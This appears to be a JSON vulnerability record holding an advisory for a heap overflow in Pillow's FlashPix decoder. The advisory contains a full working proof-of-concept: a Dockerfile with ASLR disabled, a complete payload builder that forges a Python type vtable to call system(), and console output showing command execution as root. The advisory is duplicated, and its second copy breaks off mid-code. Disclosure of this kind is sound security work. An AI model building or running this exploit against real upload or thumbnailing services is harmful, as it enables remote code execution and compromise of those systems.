            },
            {
              "deprecatedIds": [
                "CVE-2026-112398",
                "BIT-pillow-2026-112398",
                "GHSA-5x8w-8jj5-q52h"
              ],
              "fullDescription": {
                "markdown": "### Credits\n\n**Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\n### Summary\n\nA heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\n### Details\n\n`FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\n`Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\nFor a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\n```python\nMODES = {\n    ...\n    (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n    ...\n    (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n}\n```\n\nThe Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\n```c\nstate-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n...\nstate-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n```\n\nIn `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\n```c\n/* Disable decoder conversions. */\ncontext-\u003ecinfo.jpeg_color_space = JCS_UNKNOWN;\ncontext-\u003ecinfo.out_color_space  = JCS_UNKNOWN;\n```\n\nUnder `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\n```c\nok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);   // writes 4*W into a 2*W buffer\n```\n\nThis is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -\u003e tp_as_buffer -\u003e bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\n### PoC\n\nTo facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\nThe source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\n`vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\n```python\n#!/usr/bin/env python3\n# The entire vulnerable operation an application performs on an untrusted file.\nimport sys\nfrom PIL import Image\n\nImage.open(sys.argv[1]).load()\n```\n\nThe payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\n```console\n$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n[control] opening it: vtable hijack -\u003e call *0x4206c0 with rdi -\u003e 'id'\n```\n\nThen open it with `vulnerable.py`:\n\n```console\n$ python3 vulnerable.py shell.fpx\nuid=0(root) gid=0(root) groups=0(root)\ncorrupted size vs. prev_size\n```\n\n`Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\nThe trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\nalready run.\n\nThe builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\n### Impact\n\nThis is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\n### Annex A: Docker setup\n\nThe PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\n**1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\n```dockerfile\nFROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\nRUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n        ca-certificates \\\n        python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n    \u0026\u0026 rm -rf /var/lib/apt/lists/*\nRUN python3.12 -m venv /opt/v \\\n    \u0026\u0026 /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\nENV PATH=/opt/v/bin:$PATH\nWORKDIR /poc\n# ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\nENTRYPOINT [\"setarch\", \"-R\"]\nCMD [\"bash\"]\n```\n\n```console\n$ docker build -t fjpeg1-poc .\n...\nDownloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\nSuccessfully installed Pillow-12.2.0 olefile-0.47\nSuccessfully built 370344c832b6\nSuccessfully tagged fjpeg1-poc:latest\n```\n\n**2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\n```sh\ndocker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n```\n\n### Annex B: payload builder source\n\n`make_payload.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\nBuilds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -\u003e JCS_UNKNOWN\npath, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n  --crash      flood an adjacent ob_type with 0x42.. -\u003e SIGSEGV in PyBuffer_Release\n  (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -\u003e call *--target\nDefaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\nimport sys, io, struct, math, argparse\nfrom PIL import Image\n\nW, H = 65000, 2\nSECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\nFREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\nFPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\no32 = lambda v: struct.pack(\"\u003cI\", v)\np64 = lambda v: struct.pack(\"\u003cQ\", v)\nINV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\ndef jpeg(src):\n    b = io.BytesIO()\n    Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n    return b.getvalue()\n\ndef decode_row(jpg):\n    # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n    # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n    # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n    # last decoded row is the one that lands in (and overflows past) the buffer.\n    px = Image.open(io.BytesIO(jpg)).tobytes()\n    return px[(H - 1) * W * 4:].translate(INV)\n\ndef craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -\u003e iterate to converge)\n    # base fill 0xBD -\u003e decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n    # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n    src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n    for off, t in targets:\n        for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n    for it in range(iters):\n        dec = decode_row(jpeg(src)); bad = 0\n        for off, t in targets:\n            for i, v in enumerate(t):\n                if dec[off + i] != v:\n                    bad += 1\n                    src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n        if not bad: break\n    return jpeg(src), it, bad\n\ndef maxid_for(w, h):\n    s, i = max(w, h), 1\n    while s \u003e 64: s //= 2; i += 1\n    return i - 1\nMAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\ndef image_contents():\n    ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n    cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -\u003e rawmode \"LA\"\n    props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID \u003c\u003c 16), blob(cb))]\n    voff = 8 + 8 * len(props); idx = vals = b\"\"\n    for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n    body = o32(len(props)) + idx + vals\n    return (struct.pack(\"\u003cHHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n            + o32(48) + o32(len(body) + 4) + body)\n\ndef subimage_header():\n    b = bytearray(80)\n    for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n                 (56, 36), (60, 16), (64, 0), (72, 2)]:\n        struct.pack_into(\"\u003cI\", b, o, v)\n    return bytes(b)\n\ndef build_fpx(jpg, out):\n    data = b\"\\x00\" * 28 + jpg\n    assert len(data) \u003c= DATA_PAD, (len(data), DATA_PAD)\n    pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n    sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n          \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n          \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n    ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n    dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n    fsec = 1\n    while fsec * 128 \u003c fsec + content: fsec += 1\n    pos = {}; cur = fsec; dstart = cur; cur += dsec\n    for k in order: pos[k] = cur; cur += ns(sd[k])\n    total = cur\n    fat = [FREESECT] * (fsec * 128)\n    for s in range(fsec): fat[s] = FATSECT\n    def chain(a, n):\n        for j in range(n): fat[a + j] = a + j + 1 if j \u003c n - 1 else ENDOFCHAIN\n    chain(dstart, dsec)\n    for k in order: chain(pos[k], ns(sd[k]))\n    def de(nm, t, ch, l, r, st, sz, cl=b\"\\x00\" * 16):\n        n = (nm.encode(\"utf-16-le\") + b\"\\x00\\x00\").ljust(64, b\"\\x00\")[:64]\n        return (n + struct.pack(\"\u003cHBB\", min((len(nm) + 1) * 2, 64), t, 1) + o32(l) + o32(r)\n                + o32(ch) + cl + o32(0) + b\"\\x00\" * 16 + o32(st) + struct.pack(\"\u003cQ\", sz))\n    directory = pad(b\"\".join([\n        de(\"Root Entry\", 5, 1, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0, FPX_CLSID),\n        de(\"Data Object Store 000001\", 1, 2, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"\\x05Image Contents\", 2, NOSTREAM, NOSTREAM, 3, pos[\"ic\"], len(sd[\"ic\"])),\n        de(RESNAME, 1, 4, NOSTREAM, NOSTREAM, ENDOFCHAIN, 0),\n        de(\"Subimage 0000 Data\", 2, NOSTREAM, NOSTREAM, 5, pos[\"dat\"], len(sd[\"dat\"])),\n        de(\"Subimage 0000 Header\", 2, NOSTREAM, NOSTREAM, NOSTREAM, pos[\"hdr\"], len(sd[\"hdr\"]))]))\n    h = bytearray(512); h[0:8] = bytes.fromhex(\"D0CF11E0A1B11AE1\")\n    for o, fmt, *v in [(24, \"\u003cHH\", 0x3E, 3), (28, \"\u003cH\", 0xFFFE), (30, \"\u003cHH\", 9, 6), (44, \"\u003cI\", fsec),\n                       (48, \"\u003cI\", dstart), (56, \"\u003cI\", 4096), (60, \"\u003cI\", ENDOFCHAIN), (68, \"\u003cI\", ENDOFCHAIN)]:\n        struct.pack_into(fmt, h, o, *v)\n    for i in range(109): struct.pack_into(\"\u003cI\", h, 76 + i * 4, i if i \u003c fsec else FREESECT)\n    secs = [b\"\"] * total\n    for s in range(fsec): secs[s] = b\"\".join(o32(x) for x in fat[s * 128:(s + 1) * 128])\n    for j in range(dsec): secs[dstart + j] = directory[j * SECT:(j + 1) * SECT]\n    for k in order:\n        for j in range(ns(sd[k])): secs[pos[k] + j] = sd[k][j * SECT:(j + 1) * SECT]\n    open(out, \"wb\").write(bytes(h) + b\"\".join(secs))\n\ndef xhex(s): return int(s, 16)\n\nSYSTEM_PLT = 0x4206c0   # system@plt in the image's non-PIE python3.12 (fixed, no libc leak)\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"F-JPEG-1 .fpx payload builder (0-ASLR box)\")\n    ap.add_argument(\"--out\", required=True, help=\"output .fpx path\")\n    ap.add_argument(\"--crash\", action=\"store_true\",\n                    help=\"crash mode: flood an adjacent ob_type with 0x42.. and SIGSEGV (no addresses)\")\n    ap.add_argument(\"--heap-base\", type=xhex, default=0xbaa000,\n                    help=\"fixed heap base of the 0-ASLR box (default 0xbaa000)\")\n    ap.add_argument(\"--offset\", type=xhex, default=0x21e800,\n                    help=\"state-\u003ebuffer - heap_base (default 0x21e800 -\u003e S=0xdc8800)\")\n    ap.add_argument(\"--target\", type=xhex, default=SENTINEL,\n                    help=\"value called via the hijacked vtable; pass %#x (system@plt) for \"\n                         \"command execution (default is a sentinel for an RIP-control demo)\" % SYSTEM_PLT)\n    ap.add_argument(\"--cmd\", default=\"id\",\n                    help=\"command system() runs, written inline at obj+0 / rdi (\u003c=7 bytes, e.g. id, id;w)\")\n    a = ap.parse_args()\n\n    if a.crash:\n        # Pillow's CMYK JPEG path decodes inverted (decoded = 255 - src), so flood source 0xBD\n        # to make the decoded overflow bytes 0x42 -\u003e the adjacent ob_type becomes 0x4242424242424242.\n        build_fpx(jpeg(bytes([0xBD]) * (W * H * 4)), a.out)\n        print(\"[crash] %s: opening it overwrites an adjacent ob_type with 0x4242424242424242 \"\n              \"-\u003e SIGSEGV in PyBuffer_Release (no addresses)\" % a.out)\n        return\n\n    if len(a.cmd.encode()) \u003e 7:\n        sys.exit(\"--cmd must be \u003c=7 bytes (it is written inline at obj+0, before ob_type)\")\n    S = a.heap_base + a.offset\n    A0, A1, B0, B1 = 0x2000, 0xA000, 0x100, 0x2000     # spray A = fake type, spray B = TARGET\n    tg = [(OB_TYPE_OFF, p64(S + (A0 + A1) // 2)),\n          (OB_TYPE_OFF - 8, a.cmd.encode() + b\"\\x00\")]      # obj+0 -\u003e rdi for system()\n    tg += [(o, p64(S + 0x100)) for o in range(A0, A1, 8)]   # fake type -\u003e spray B at +0xa0..+8\n    tg += [(o, p64(a.target)) for o in range(B0, B1, 8)]\n    jpg, it, bad = craft(tg)\n    build_fpx(jpg, a.out)\n    print(\"[control] %s: S=%#x target=%#x cmd=%r craft_iters=%d bad=%d\"\n          % (a.out, S, a.target, a.cmd, it, bad))\n    print(\"[control] opening it: vtable hijack -\u003e call *%#x with rdi -\u003e %r\" % (a.target, a.cmd))\n\nif __name__ == \"__main__\":\n    main()\n```",
                "text": "### Credits\n\n**Researcher**: Alex Bouffard (mixbo@pebwalker.com)\n\n### Summary\n\nA heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).\n\n### Details\n\n`FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.\n\n`Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.\n\nFor a JPEG-compressed subimage (`compression == 2`), the plugin builds a `\"jpeg\"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):\n\n```python\nMODES = {\n    ...\n    (0x00018000, 0x00017FFE): (\"RGBA\", \"LA\"),                # rawmode \"LA\"  (2 bytes/pixel)\n    ...\n    (0x00020000, 0x00020001, 0x00020002): (\"RGB\", \"YCC;P\"),  # rawmode \"YCC;P\"\n}\n```\n\nThe Imaging output buffer for the tile is sized for the rawmode (here `\"LA\"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):\n\n```c\nstate-\u003ebytes = (state-\u003ebits * state-\u003exsize + 7) / 8;   // \"LA\" gives 2 * xsize bytes/row\n...\nstate-\u003ebuffer = (UINT8 *)calloc(1, state-\u003ebytes);\n```\n\nIn `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `\"LA\"` and `\"YCC;P\"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):\n\n```c\n/* Disable decoder conversions. */\ncontext-\u003ecinfo.jpeg_color_space = JCS_UNKNOWN;\ncontext-\u003ecinfo.out_color_space  = JCS_UNKNOWN;\n```\n\nUnder `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):\n\n```c\nok = jpeg_read_scanlines(\u0026context-\u003ecinfo, \u0026state-\u003ebuffer, 1);   // writes 4*W into a 2*W buffer\n```\n\nThis is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -\u003e tp_as_buffer -\u003e bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.\n\n### PoC\n\nTo facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).\n\nThe source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).\n\n`vulnerable.py` is the program under test, a one-liner that opens the file it is given:\n\n```python\n#!/usr/bin/env python3\n# The entire vulnerable operation an application performs on an untrusted file.\nimport sys\nfrom PIL import Image\n\nImage.open(sys.argv[1]).load()\n```\n\nThe payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:\n\n```console\n$ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx\n[control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0\n[control] opening it: vtable hijack -\u003e call *0x4206c0 with rdi -\u003e 'id'\n```\n\nThen open it with `vulnerable.py`:\n\n```console\n$ python3 vulnerable.py shell.fpx\nuid=0(root) gid=0(root) groups=0(root)\ncorrupted size vs. prev_size\n```\n\n`Image.open()` of the crafted file runs the baked command via `system(\"id\")`: command execution as the user running the image processing (root in the container).\n\nThe trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has\nalready run.\n\nThe builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.\n\n### Impact\n\nThis is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.\n\n### Annex A: Docker setup\n\nThe PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.\n\n**1. Build the image.** Put `vulnerable.py` (PoC) and `make_payload.py`\n([Annex B](#annex-b-payload-builder-source)) in a directory with this `Dockerfile`:\n\n```dockerfile\nFROM ubuntu:24.04@sha256:786a8b558f7be160c6c8c4a54f9a57274f3b4fb1491cf65146521ae77ff1dc54\nRUN apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\\n        ca-certificates \\\n        python3.12=3.12.3-1ubuntu0.13 python3.12-venv=3.12.3-1ubuntu0.13 \\\n    \u0026\u0026 rm -rf /var/lib/apt/lists/*\nRUN python3.12 -m venv /opt/v \\\n    \u0026\u0026 /opt/v/bin/pip install --no-cache-dir \"Pillow==12.2.0\" \"olefile==0.47\"\nENV PATH=/opt/v/bin:$PATH\nWORKDIR /poc\n# ASLR is an OS mitigation unrelated to the bug; disable it in-image for a deterministic heap.\nENTRYPOINT [\"setarch\", \"-R\"]\nCMD [\"bash\"]\n```\n\n```console\n$ docker build -t fjpeg1-poc .\n...\nDownloading pillow-12.2.0-cp312-cp312-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (7.1 MB)\nSuccessfully installed Pillow-12.2.0 olefile-0.47\nSuccessfully built 370344c832b6\nSuccessfully tagged fjpeg1-poc:latest\n```\n\n**2. Start the (ASLR-disabled) container shell** with the scripts mounted:\n\n```sh\ndocker run --rm -it --security-opt seccomp=unconfined -v \"$PWD:/poc\" -w /poc fjpeg1-poc\n```\n\n### Annex B: payload builder source\n\n`make_payload.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"F-JPEG-1 payload builder for a 0-ASLR box (x86_64 + glibc), pure Pillow (no native toolchain).\nBuilds an .fpx whose embedded 4-component JPEG, decoded via Pillow's FpxImagePlugin -\u003e JCS_UNKNOWN\npath, overflows the 2-byte/px decode buffer and overwrites an adjacent object's ob_type.\n  --crash      flood an adjacent ob_type with 0x42.. -\u003e SIGSEGV in PyBuffer_Release\n  (default)    CONTROL: fake vtable at the fixed (no-ASLR) addresses -\u003e call *--target\nDefaults target the pinned Docker image with ASLR disabled (setarch -R). See --help.\"\"\"\nimport sys, io, struct, math, argparse\nfrom PIL import Image\n\nW, H = 65000, 2\nSECT, OB_TYPE_OFF, DATA_PAD, SENTINEL = 512, 130024, 0x18000, 0x4142434445464748\nFREESECT, ENDOFCHAIN, FATSECT, NOSTREAM = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD, 0xFFFFFFFF\nFPX_CLSID = bytes.fromhex(\"0067615654C1CE11855300AA00A1F95B\")\no32 = lambda v: struct.pack(\"\u003cI\", v)\np64 = lambda v: struct.pack(\"\u003cQ\", v)\nINV = bytes(255 - i for i in range(256))   # 8-bit inversion table\n\ndef jpeg(src):\n    b = io.BytesIO()\n    Image.frombytes(\"CMYK\", (W, H), bytes(src)).save(b, \"JPEG\", quality=100, subsampling=0)\n    return b.getvalue()\n\ndef decode_row(jpg):\n    # Predict what the vulnerable JCS_UNKNOWN path decodes, using Pillow itself: JCS_UNKNOWN emits\n    # the raw JPEG components R, while Pillow's own CMYK decode of the same file returns 255 - R\n    # (the Adobe-CMYK inversion). So 255 - Image.open(jpg) is exactly the vulnerable output. The\n    # last decoded row is the one that lands in (and overflows past) the buffer.\n    px = Image.open(io.BytesIO(jpg)).tobytes()\n    return px[(H - 1) * W * 4:].translate(INV)\n\ndef craft(targets, iters=40):  # decode-feedback exact write (JPEG is lossy -\u003e iterate to converge)\n    # base fill 0xBD -\u003e decodes to 0x42, so the overflow GAPS match the crash-mode flood pattern\n    # that reaches PyBuffer_Release cleanly (uniform 0x42 avoids a premature glibc free() abort).\n    src = bytearray(b\"\\xbd\" * (W * H * 4)); base = (H - 1) * W * 4; it = 0\n    for off, t in targets:\n        for i, v in enumerate(t): src[base + off + i] = src[off + i] = 255 - v\n    for it in range(iters):\n        dec = decode_row(jpeg(src)); bad = 0\n        for off, t in targets:\n            for i, v in enumerate(t):\n                if dec[off + i] != v:\n                    bad += 1\n                    src[base + off + i] = src[off + i] = max(0, min(255, src[base + off + i] + dec[off + i] - v))\n        if not bad: break\n    return jpeg(src), it, bad\n\ndef maxid_for(w, h):\n    s, i = max(w, h), 1\n    while s \u003e 64: s //= 2; i += 1\n    return i - 1\nMAXID = maxid_for(W, H); RESNAME = \"Resolution %04d\" % MAXID\n\ndef image_contents():\n    ui4 = lambda v: o32(19) + o32(v); blob = lambda b: o32(65) + o32(len(b)) + b\n    cb = o32(1) + o32(2) + o32(0x00018000) + o32(0x00017FFE)        # FPX color -\u003e rawmode \"LA\"\n    props = [(0x1000002, ui4(W)), (0x1000003, ui4(H)), (0x2000002 | (MAXID \u003c\u003c 16), blob(cb))]\n    voff = 8 + 8 * len(props); idx = vals = b\"\"\n    for pid, v in props: idx += o32(pid) + o32(voff); vals += v; voff += len(v)\n    body = o32(len(props)) + idx + vals\n    return (struct.pack(\"\u003cHHI\", 0xFFFE, 0, 0x00020005) + b\"\\x00\" * 16 + o32(1) + b\"\\x00\" * 16\n            + o32(48) + o32(len(body) + 4) + body)\n\ndef subimage_header():\n    b = bytearray(80)\n    for o, v in [(32, W), (36, H), (40, 1), (44, max(W, 256)), (48, max(H, 256)), (52, 2),\n                 (56, 36), (60, 16), (64, 0), (72, 2)]:\n        struct.pack_into(\"\u003cI\", b, o, v)\n    return bytes(b)\n\ndef build_fpx(jpg, out):\n    data = b\"\\x00\" * 28 + jpg\n    assert len(data) \u003c= DATA_PAD, (len(data), DATA_PAD)\n    pad = lambda x: x + b\"\\x00\" * ((-len(x)) % SECT)\n    sd = {\"ic\": pad(image_contents().ljust(4096, b\"\\x00\")),\n          \"hdr\": pad(subimage_header().ljust(4096, b\"\\x00\")),\n          \"dat\": pad(data.ljust(DATA_PAD, b\"\\x00\"))}\n    ns = lambda x: len(x) // SECT; order = [\"ic\", \"dat\", \"hdr\"]\n    dsec = math.ceil(6 * 128 / SECT); content = dsec + sum(ns(sd[k]) for k in order)\n    fsec = 1\n    while fsec * 128 \u003c fsec + content: fsec += 1\n    pos = {}; cur = fsec; dstart = cur; cur += dsec\n    for k in order: pos[k] = cur; cur += ns(sd[k])\n    total = cur\n    fat = [FREESECT] * (fsec * 128)\n    for s in 